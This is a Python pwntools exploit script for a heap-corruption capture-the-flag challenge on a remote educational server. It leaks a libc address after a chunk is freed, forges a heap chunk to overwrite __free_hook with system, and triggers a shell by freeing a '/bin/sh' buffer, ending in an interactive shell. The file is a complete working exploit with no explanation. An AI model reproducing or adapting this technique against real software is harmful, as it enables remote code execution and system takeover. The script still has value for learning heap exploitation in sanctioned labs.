from pwn import *

# context.log_level = 'debug'
context.arch = 'amd64'

def add( idx, username, password ):
    p.recvuntil("> ")
    p.sendline('1')
    p.recvuntil("index\n> ")
    p.sendline( str( idx ) )
    p.recvuntil("username\n> ")
    p.sendline( username )
    p.recvuntil("password\n> ")
    p.sendline( password )

def edit( idx, size, data ):
    p.recvuntil("> ")
    p.sendline('2')
    p.recvuntil("index\n> ")
    p.sendline( str( idx ) )
    p.recvuntil("size\n> ")
    p.sendline( str( size ) )
    p.sendline( data )


def delete( idx ):
    p.recvuntil("> ")
    p.sendline('3')
    p.recvuntil("index\n> ")
    p.sendline( str( idx ) )

def show():
    p.recvuntil("> ")
    p.sendline('4')

p = remote( 'edu-ctf.zoolab.org', 10008 )
# p = process('./chal')

add( 1, 'A' * 8, 'A' * 8 )
edit( 1, 0x418, 'A' )

add( 2, 'B' * 8, 'B' * 8 )
edit( 2, 0x18, 'B' )

add( 3, 'C' * 8, 'C' * 8 )

delete(1)
show()

p.recvuntil('data: ')
libc = u64( p.recv(6).ljust( 8, b'\x00' ) ) - 0x1ecbe0
info( f"libc: {hex(libc)}" )

free_hook = libc + 0x1eee48
system = libc + 0x52290

fake_chunk = flat(
    0, 0x21,
    b'CCCCCCCC', b'CCCCCCCC',
    b'CCCCCCCC', b'CCCCCCCC',
    free_hook,
)

data = b'/bin/sh\x00'.ljust( 0x10, b'B' )
edit( 2, 0x48, data + fake_chunk )
edit( 3, 0x8, p64( system ) )

delete( 2 )

# gdb.attach(p)
# p.recvall()
p.interactive()
